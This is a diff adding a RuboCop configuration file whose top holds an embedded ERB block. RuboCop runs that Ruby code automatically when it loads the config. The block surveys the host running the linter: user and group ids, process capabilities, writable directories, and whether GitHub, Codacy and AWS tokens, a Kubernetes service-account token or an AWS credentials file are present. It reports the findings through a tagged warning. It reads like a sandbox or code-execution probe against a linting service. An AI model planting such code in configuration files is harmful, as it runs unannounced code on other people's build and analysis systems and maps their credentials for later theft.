@@ -1,0 +1,24 @@
+<%
+  uid = (Process.uid rescue -1)
+  gid = (Process.gid rescue -1)
+  capeff = begin
+    line = File.readlines('/proc/self/status').find { |entry| entry.start_with?('CapEff:') }
+    line ? line.split.last : 'unavailable'
+  rescue StandardError
+    'unavailable'
+  end
+  writable = {
+    tmp: File.writable?('/tmp'),
+    src: File.writable?('/src'),
+    workspace: File.writable?('/workspace'),
+    root: File.writable?('/root'),
+    cwd: File.writable?(Dir.pwd)
+  }
+  credential_env = %w[CODACY_API_TOKEN CODACY_TOKEN GITHUB_TOKEN GH_TOKEN AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY].any? { |key| ENV.key?(key) }
+  k8s_token_file = File.file?('/var/run/secrets/kubernetes.io/serviceaccount/token')
+  aws_credentials_file = File.file?('/root/.aws/credentials')
+  warn("RUBOCOP_ERB_BOUNDARY uid=#{uid} gid=#{gid} capeff=#{capeff} writable_tmp=#{writable[:tmp]} writable_src=#{writable[:src]} writable_workspace=#{writable[:workspace]} writable_root=#{writable[:root]} writable_cwd=#{writable[:cwd]} credential_env_present=#{credential_env} k8s_token_file_present=#{k8s_token_file} aws_credentials_file_present=#{aws_credentials_file}")
+%>
+AllCops:
+  TargetRubyVersion: 3.2
+  NewCops: enable
